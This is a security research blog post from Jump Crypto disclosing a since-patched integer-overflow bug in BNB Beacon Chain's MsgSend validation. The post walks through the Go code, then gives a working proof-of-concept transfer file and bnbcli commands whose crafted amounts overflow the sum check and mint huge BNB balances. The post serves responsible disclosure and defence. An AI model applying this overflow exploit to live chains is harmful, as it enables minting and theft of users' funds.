[](/)

  * Building 
    * [Firedancer](/firedancer/)
    * [the Pit](/thepit/)
    * [Cyclone](/cyclone/)
  * Thinking 
    * [Writing](/writing/)
    * [Research](/research/)
  * [Connect](/connect/)

  * [Building](/)
    * [Firedancer](/firedancer/)
    * [the Pit](/thepit/)
    * [Cyclone](/cyclone/)
    * [Collaborations](/collaborations/)
  * [Thinking](/writing/)
    * [Writing](/writing/)
    * [Research](/research/)
    * [Media](/media/)
  * [About](/writing/)
    * [Chronicle](/chronicle/)
    * [Validator](/validator-security/)
    * [Brand & Press](/brand/)
    * [Connect](/connect/)

[](https://twitter.com/jump_)[](https://github.com/JumpCrypto)[](https://www.youtube.com/@jump_)

[Terms of Use_](/terms-of-use/)[Privacy Policy_](/data-protection-and-privacy-
policy/)[Disclaimers_](/nfa/)

![](data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM2NSIgaGVpZ2h0PSI3MTEiIHZpZXdCb3g9IjAgMCAxMzY1IDcxMSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgb3BhY2l0eT0iMC4zIj4KPHJlY3QgeT0iOTIuNzM5MSIgd2lkdGg9IjE0Mi45NzMiIGhlaWdodD0iNjEuODI2MSIgZmlsbD0iIzBFMjE0NyIvPgo8cmVjdCB4PSIxNzMuODg2IiB5PSIyNzguMjE4IiB3aWR0aD0iNDYzLjY5NiIgaGVpZ2h0PSI2MS44MjYxIiBmaWxsPSIjMEUyMTQ3Ii8+CjxwYXRoIGQ9Ik0xNzMuODg2IDM3MC45NTZINDQwLjUxMVY0MzIuNzgySDE3My44ODZWMzcwLjk1NloiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3QgeD0iMTczLjg4NiIgeT0iNDYzLjY5NiIgd2lkdGg9IjM3OC42ODUiIGhlaWdodD0iNjEuODI2MSIgZmlsbD0iIzBFMjE0NyIvPgo8cmVjdCB4PSIxNzMuODg2IiB5PSI5Mi43MzkxIiB3aWR0aD0iNDg2Ljg4IiBoZWlnaHQ9IjYxLjgyNjEiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3QgeD0iNjY3LjI2IiB5PSIyNzguNDkyIiB3aWR0aD0iNDA1LjczNCIgaGVpZ2h0PSI2MS44MjYxIiBmaWxsPSIjMEUyMTQ3Ii8+CjxyZWN0IHg9IjQ3MS40MjUiIHk9IjM3MC45NTYiIHdpZHRoPSI1MTAuMDY1IiBoZWlnaHQ9IjYxLjgyNjEiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3QgeD0iMTAxMi40IiB5PSIzNzAuOTU2IiB3aWR0aD0iMjgyLjA4MiIgaGVpZ2h0PSI2MS44MjYxIiBmaWxsPSIjMEUyMTQ3Ii8+CjxyZWN0IHg9IjkyLjczOTMiIHk9IjE4NS40NzgiIHdpZHRoPSI0MDUuNzM0IiBoZWlnaHQ9IjYxLjgyNjEiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3QgeD0iOTIuNzM5MyIgeT0iNTU2LjQzNSIgd2lkdGg9IjIzOS41NzYiIGhlaWdodD0iNjEuODI2MSIgZmlsbD0iIzBFMjE0NyIvPgo8cmVjdCB4PSI1ODMuNDgzIiB5PSI0NjMuNjk2IiB3aWR0aD0iMjg1Ljk0NiIgaGVpZ2h0PSI2MS44MjYxIiBmaWxsPSIjMEUyMTQ3Ii8+CjxyZWN0IHg9IjkwMC44MDIiIHk9IjQ2My42MzEiIHdpZHRoPSIxNjIuMjEzIiBoZWlnaHQ9IjYyLjEyNDIiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3QgeD0iNjkxLjY4MSIgeT0iOTIuNzM5MSIgd2lkdGg9IjI5Ny41MzgiIGhlaWdodD0iNjEuODI2MSIgZmlsbD0iIzBFMjE0NyIvPgo8cmVjdCB4PSI1OTguOTQiIHk9IjE4NS40NzgiIHdpZHRoPSIyOTcuNTM4IiBoZWlnaHQ9IjYxLjgyNjEiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3QgeD0iMTAyMC40NSIgeT0iOTMuMTg2MyIgd2lkdGg9IjI3My44MDciIGhlaWdodD0iNjAuOTczOCIgZmlsbD0iIzBFMjE0NyIvPgo8cmVjdCB4PSI5OTYuOTQ2IiB5PSIxODUuNDc4IiB3aWR0aD0iMjk3LjUzOCIgaGVpZ2h0PSI2MS44MjYxIiBmaWxsPSIjMEUyMTQ3Ii8+CjxyZWN0IHg9IjEwOTMuNzkiIHk9IjQ2My4xNDQiIHdpZHRoPSIzOC42NDEzIiBoZWlnaHQ9IjYxLjgyNjEiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3QgeD0iNTI5LjM4NiIgeT0iMTg1LjQ3OCIgd2lkdGg9IjM4LjY0MTMiIGhlaWdodD0iNjEuODI2MSIgZmlsbD0iIzBFMjE0NyIvPgo8cmVjdCB4PSI5MjcuMzkxIiB5PSIxODUuNDc4IiB3aWR0aD0iMzguNjQxMyIgaGVpZ2h0PSI2MS44MjYxIiBmaWxsPSIjMEUyMTQ3Ii8+CjxyZWN0IHg9IjEzMjUuNCIgeT0iMTg1LjQ3OCIgd2lkdGg9IjM4LjY0MTMiIGhlaWdodD0iNjEuODI2MSIgZmlsbD0iIzBFMjE0NyIvPgo8cmVjdCB4PSIzNjMuMjI4IiB5PSI1NTYuNDM1IiB3aWR0aD0iMzguNjQxMyIgaGVpZ2h0PSI2MS44MjYxIiBmaWxsPSIjMEUyMTQ3Ii8+CjxyZWN0IHk9IjY0OS4xNzQiIHdpZHRoPSIzOC42NDEzIiBoZWlnaHQ9IjYxLjgyNjEiIGZpbGw9IiMwRTIxNDciLz4KPHJlY3Qgd2lkdGg9IjE0MyIgaGVpZ2h0PSI2MiIgZmlsbD0iIzBFMjE0NyIvPgo8L2c+Cjwvc3ZnPgo=)

# Helping Secure BNB Chain Through Responsible Disclosure

![Felix Wilhelm](https://jumpcrypto-com.ghost.io/content/images/2023/02/image
--202-.jpg)

###### Felix Wilhelm

[Security](/writing/security/)[Research](/writing/research/)[Ecosystem](/writing/ecosystem/)

Feb 10 2023 _ 6 min read

![Helping Secure BNB Chain Through Responsible Disclosure](https://jumpcrypto-
com.ghost.io/content/images/2023/02/Blog---Securing--BNB-Chain-through--
responsible-disclosure-v1.png)

## Introduction

In this blog post, we describe a vulnerability we discovered in the BNB Beacon
Chain, the governance and staking layer of BNB Chain. The issue would have
allowed an attacker to mint an infinite number of arbitrary tokens on the BNB
chain, potentially leading to a large loss of funds. We privately disclosed
the issue to the BNB team, which developed and deployed a patch in less than
24 hours. Thanks to this effort, no malicious exploitation took place, and no
funds were lost.

As part of our efforts as builders, researchers, and collaborators in the
crypto space, one of our goals at Jump Crypto is to improve security
assurances across the entire ecosystem. To that end, our dedicated security
team recently started a broad research effort dedicated to discovering and
patching vulnerabilities across projects via [coordinated
disclosure](https://en.wikipedia.org/wiki/Coordinated_vulnerability_disclosure?ref=jumpcrypto.com),
and this post is an outcome of these efforts.

* * *

In a somewhat novel architecture, BNB Chain is composed of two blockchains:
The EVM compatible Smart Chain (BSC), which is based on a fork of go-ethereum
and the Beacon Chain (BC), built on top of Tendermint and Cosmos SDK.

Interestingly, the Beacon Chain does not follow the upstream version of Cosmos
SDK but uses a BNB fork hosted on [GitHub](https://github.com/bnb-chain/bnc-
cosmos-sdk?ref=jumpcrypto.com). This forked version contains several BNB-
specific changes. It deviates from the Cosmos SDK upstream in several ways,
motivating us to take extra care in reviewing the differences.

## Technical Details

To understand the vulnerability, we first need to introduce two fundamental
building blocks of Cosmos SDK-based blockchains: Messages and Coins.

**Messages** are the primary way Clients interact with a Cosmos chain.
Modules, which are responsible for the business logic of the chain, can define
their own message types and handlers to perform state transitions. In addition
to application-specific message types (like BNB’s
[`[BurnMsg]`](https://github.com/bnb-
chain/node/blob/f90fb8007e88c5bea6f3c8c5b5413533cbce7818/plugins/tokens/burn/msg.go?ref=jumpcrypto.com#L19)),
the Cosmos SDK provides several core modules that define message types for
functionality such as transferring funds (`[[MsgSend]](https://github.com/bnb-
chain/bnc-cosmos-
sdk/blob/6979480679f6c4980aa5a5ac11ce874f54f2a927/x/bank/msgs.go?ref=jumpcrypto.com#L9)`)
or delegating stake ([`MsgDelegate`](https://github.com/bnb-chain/bnc-cosmos-
sdk/blob/6979480679f6c4980aa5a5ac11ce874f54f2a927/x/stake/types/msg.go?ref=jumpcrypto.com#L306)).
Any Client can submit these messages as part of a transaction, so ensuring
that message handlers correctly deal with malicious inputs is a fundamental
part of reviewing any Cosmos-based blockchain.

A **Coin** is the data type used by Cosmos SDK to handle assets. Coins hold a
certain amount of a specific currency, and the BNB Cosmos fork uses the
following definition:

    
    
    // Coin hold some amount of one currency
    type Coin struct {
    	Denom  string `json:"denom"`
    	Amount int64  `json:"amount"`
    }
    

From a security perspective, securely interacting with the `Coin` type is
quite difficult. The `Amount` field is signed, which means it can contain
negative numbers. In addition, `int64` is a Golang primitive that can silently
over- and underflow when used in calculations. Even more interesting is the
deviation between the BNB fork and the upstream Cosmos SDK for this type.
While upstream still supports negative values in the `Amount` field, it [uses
a safe bigInt wrapper](https://github.com/cosmos/cosmos-
sdk/blob/a186d2a69f89fd93f02b16e3296abf5271af50ac/types/coin.pb.go?ref=jumpcrypto.com#L34)
instead of `int64`, protecting applications from unexpected over- and
underflows.

We reached out to the BNB Core team, which emphasized that choice of primitive
type was a hard tradeoff decision to improve the performance of the DEX which
used to run on BNB Beacon Chain. The BNB core team applied several rounds of
security due diligence to rule out any overflow issues, but missed this
particular instance. Given these performance requirements don’t apply anymore,
they are working to implement the safe wrapper across their codebase.

Searching for message handlers that are at risk due to this behavior quickly
led us to the `MsgSend` type that is part of the standard `x/bank` module:

    
    
    //https://github.com/bnb-chain/bnc-cosmos-sdk/blob/6979480679f6c4980aa5a5ac11ce874f54f2a927/x/bank/msgs.go
    // MsgSend - high level transaction of the coin module
    type MsgSend struct {
    	Inputs  []Input  `json:"inputs"`
    	Outputs []Output `json:"outputs"`
    }
    
    // Transaction Input
    type Input struct {
    	Address sdk.AccAddress `json:"address"`
    	Coins   sdk.Coins      `json:"coins"`
    }
    
    // Transaction Output
    type Output struct {
    	Address sdk.AccAddress `json:"address"`
    	Coins   sdk.Coins      `json:"coins"`
    }
    
    // Coins is a set of Coin, one per currency
    type Coins []Coin
    

While `MsgSend` is often used for simple 1-to-1 token transfers between two
accounts, it supports a more generic form of multi-party transfers with the
`Inputs` and `Outputs` arrays. The `Inputs` array consists of a list of sender
addresses and the assets they want to transfer, and the `Outputs` array
contains the destination addresses and the assets they should receive.

To not allow trivial theft of funds or malicious minting of new assets, the
MsgSend message handler needs to enforce several invariants:

All accounts listed in the `Inputs` array need to sign the transaction. This
is enforced as part of the normal Cosmos signature verification flow using the
`GetSigners()` method:

    
    
    // Implements Msg.
    func (msg MsgSend) GetSigners() []sdk.AccAddress {
    	addrs := make([]sdk.AccAddress, len(msg.Inputs))
    	for i, in := range msg.Inputs {
    		addrs[i] = in.Address
    	}
    	return addrs
    }
    

All Coin amounts specified in the `Inputs` and `Outputs` arrays need to be
positive, as a transfer of a negative amount could be used to steal funds from
a recipient. This verification is handled as part of the `ValidateBasic()`
method of the two types:

    
    
    // ValidateBasic - validate transaction input
    func (in Input) ValidateBasic() sdk.Error {
    	if len(in.Address) != sdk.AddrLen {
    		return sdk.ErrInvalidAddress(in.Address.String())
    	}
    	if !in.Coins.IsValid() {
    		return sdk.ErrInvalidCoins(in.Coins.String())
    	}
    	if !in.Coins.IsPositive() {
    		return sdk.ErrInvalidCoins(in.Coins.String())
    	}
    	return nil
    }
    
    // ValidateBasic - validate transaction output
    func (out Output) ValidateBasic() sdk.Error {
    	if len(out.Address) != sdk.AddrLen {
    		return sdk.ErrInvalidAddress(out.Address.String())
    	}
    	if !out.Coins.IsValid() {
    		return sdk.ErrInvalidCoins(out.Coins.String())
    	}
    	if !out.Coins.IsPositive() {
    		return sdk.ErrInvalidCoins(out.Coins.String())
    	}
    	return nil
    }
    

Finally, the number of Input tokens needs to be equivalent to the number of
Output tokens. This has to be checked early in the message handling as the
[code responsible for the actual transfer of the
funds](https://github.com/bnb-chain/bnc-cosmos-
sdk/blob/6979480679f6c4980aa5a5ac11ce874f54f2a927/x/bank/keeper.go?ref=jumpcrypto.com#L232)
subtracts the Input tokens from the Sender accounts and adds the Output tokens
to the receiving ones. While the code ensures that the Sender has the assets
they want to transfer, it does not verify that the Outputs array doesn’t
create tokens out of thin air.

Instead, this check is done as part of the `ValidateBasic()` method of
`MsgSend`:

    
    
    // Implements Msg.
    func (msg MsgSend) ValidateBasic() sdk.Error {
    	[..]
    	// make sure all inputs and outputs are individually valid
    	var totalIn, totalOut sdk.Coins
    	for _, in := range msg.Inputs {
    		if err := in.ValidateBasic(); err != nil {
    			return err.TraceSDK("")
    		}
    		totalIn = totalIn.Plus(in.Coins) // (A)
    	}
    	for _, out := range msg.Outputs {
    		if err := out.ValidateBasic(); err != nil {
    			return err.TraceSDK("")
    		}
    		totalOut = totalOut.Plus(out.Coins) // (B)
    	}
    	// make sure inputs and outputs match
    	if !totalIn.IsEqual(totalOut) { 
    		return sdk.ErrInvalidCoins(totalIn.String()).TraceSDK("inputs and outputs don't match")
    	}
    	return nil
    }
    

The code loops over the input array and sums up all Coins arrays in the
`totalIn` variable; it then does the same for the output array and stores the
result in `totalOut`. Validation is only successful if both sums are equal.
`in.Coins` and `out.Coins` are each of type `sdk.Coins`, which is an array of
`Coin` entries for different currencies. For the simplest case, where we only
deal with a single currency, the `Plus` method calls in **(A)** and **(B)**
boil down to the `Coin.Plus` method as shown below:

    
    
    // Adds amounts of two coins with same denom
    func (coin Coin) Plus(coinB Coin) Coin {
    	if !coin.SameDenomAs(coinB) {
    		return coin
    	}
    	return Coin{coin.Denom, coin.Amount + coinB.Amount}
    }
    

The method adds the two `Amount` fields, not checking for potential overflows.
This makes bypassing the `totalIn == totalOut` check straightforward by
triggering an integer overflow in the `totalOut` calculation.

An example transfer that exploits this issue to “mint” an almost unlimited
amount of BNB tokens via a malicious transfer is shown below: Adding the three
output amount fields results in the value 0x10000000000000001, which is too
large to fit into a 64bit variable and will overflow to 1. This means that the
destination accounts can receive a much larger number of BNB tokens than the
sender provided:

    
    
    $ # Sender Account
    $ bnbcli account bnb1sdg96khysz899gjhucmep6as8zh6zam4u6j6c3 --chain-id=${chainId} | jq ".value.base.coins"
    [
      { // dev0
        "denom": "BNB",
        "amount": "100000060"
      }
    ]
    $ # Destination Account does not exist yet
    $ bnbcli account bnb15q940mktrr5s77x2n0hyc0l7yfu55sk6uugfrp --chain-id=${chainId} | jq ".value.base.coins"
    ERROR: No account with address bnb15q940mktrr5s77x2n0hyc0l7yfu55sk6uugfrp was found in the state.
    $ # Transfer details to trigger the overflow
    $ cat transfer.json 
    [
       {
          "to":"bnb15q940mktrr5s77x2n0hyc0l7yfu55sk6uugfrp",
          "amount":"9223372036854775000:BNB"
       },
       {
          "to":"bnb1a8p35jlfzz7td4tljcrpfw3gv9z48ady6l248d",
          "amount":"9223372036854775000:BNB"
       },
       { 
    	   "to":"bnb1dl0x933432der5rnafk4037dwtk8rzmh59jv2h",
    	   "amount": "1617:BNB" }
    ]
    $ # Send the transfer
    $ bnbcli token multi-send --chain-id=${chainId} --from dev0 --transfers-file transfer.json 
    Password to sign with 'dev0':
    Committed at block 17449
    
    $ # Destination account now has ~92 billion BNB tokens
    $ bnbcli account bnb15q940mktrr5s77x2n0hyc0l7yfu55sk6uugfrp --chain-id=${chainId} | jq ".value.base.coins"
    [
      {
        "denom": "BNB",
        "amount": "9223372036854775000"
      }
    ]
    

The BNB team fixed the issue, by switching to overflow resistant arithmetic
methods for the sdk.Coin type. After the patch, an overflow in the Coin
calculation will cause a golang panic and a transaction failure.

## Parting Thoughts

Bugs that allow infinite minting of native assets are some of the most
critical vulnerabilities in web3. As such, this finding is proof that we all
must stay vigilant and collaborate to elevate security assurances across all
projects.

At Jump Crypto, we believe in the promise of web3 and are working hard to
build and foster safer, scalable and useful systems in the space. That’s why,
over the past year, we’ve been building up a dedicated security team working
around the clock conducting core research, and are working with teams to
strengthen the security of the entire ecosystem.

Share

![](/static/subscribe2-825809a798c6960f978785c6581f4afb.svg)

#### Stay up to date with the latest from Jump_

​

.Subscribe

#### More articles

![SAFU: Creating a Standard for Whitehats](https://jumpcrypto-
com.ghost.io/content/images/2022/10/Standards-for-Whitehats-Thread---
blog.png)SAFU: Creating a Standard for WhitehatsWhitehats and DeFi protocols
need a shared understanding of security policy. We propose the SAFU - Simple
Arrangement for Funding Upload - as a versatile and credible way to let
whitehats know what to...](/writing/safu-creating-a-standard-for-whitehats/)

Oct 24 2022 _ 17 min

Share

[![Huckleberry: IBC Event Hallucinations](https://jumpcrypto-
com.ghost.io/content/images/2023/09/New-Blog-Post.png)Huckleberry: IBC Event
HallucinationsThis blog post describes a vulnerability in ibc-go, the
reference implementation of the Interblockchain Communication Protocol (IBC)
used by most Cosmos blockchains](/writing/huckleberry-ibc-event-
hallucinations/)

Sep 06 2023 _ 4 min

Share

[![Mapping Markets: Evaluating Blockchain’s Mass Adoption
Potential](https://jumpcrypto-com.ghost.io/content/images/2023/06/Blog---
Mapping-Markets_-Evaluating-Blockchain-s-Mass-Adoption-Potential.png)Mapping
Markets: Evaluating Blockchain’s Mass Adoption PotentialIn this post, we
propose a geographically-oriented framework, which we call “Pueyo Maps”
(inspired by Tomas Pueyo’s geo-history), as a way of evaluating the long-term
suitability of blockchain-based s...](/writing/mapping-markets-blockchain-
mass-adoption-potential/)

Jun 05 2023 _ 20 min

Share

Disclaimer

The information on this website and on the Brick by Brick podcast or Ship Show
Twitter spaces is provided for informational, educational, and entertainment
purposes only.  This information is not intended to be and does not constitute
financial advice, investment advice, trading advice, or any other type of
advice.  You should not make any decision – financial, investment, trading or
otherwise – based on any of the information presented here without undertaking
your own due diligence and consulting with a financial adviser.  Trading,
including that of digital assets or cryptocurrency, has potential rewards as
well as potential risks involved. Trading may not be suitable for all
individuals. Recordings of podcast episodes or Twitter spaces events may be
used in the future.

![](data:image/svg+xml;charset=utf-8,%3Csvg height='619' width='1338'
xmlns='http://www.w3.org/2000/svg' version='1.1'%3E%3C/svg%3E)

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAD0lEQVQoz2NgGAWjYBgCAALZAAHP5sSUAAAAAElFTkSuQmCC)![](/static/bb55dfe76137757a150d8db409a314e1/80e7e/brandLines.svg)

###### Building_

  * [Firedancer](/firedancer/)
  * [the Pit](/thepit/)
  * [Cyclone](/cyclone/)

###### Thinking_

  * [Writing](/writing/)
  * [Research](/research/)

###### About_

  * [Validator Security](/validator-security/)
  * [Connect](/connect/)

[Terms of Use_](/terms-of-use/)[Privacy Policy_](/data-protection-and-privacy-
policy/)[Disclaimers_](/nfa/)

© 2024 Jump Crypto. All Rights Reserved.

Jump Crypto does not operate any business lines that accept funds from
external investors. Any person, company, or app purporting to accept external
investor funds on behalf of Jump Crypto is fraudulent.

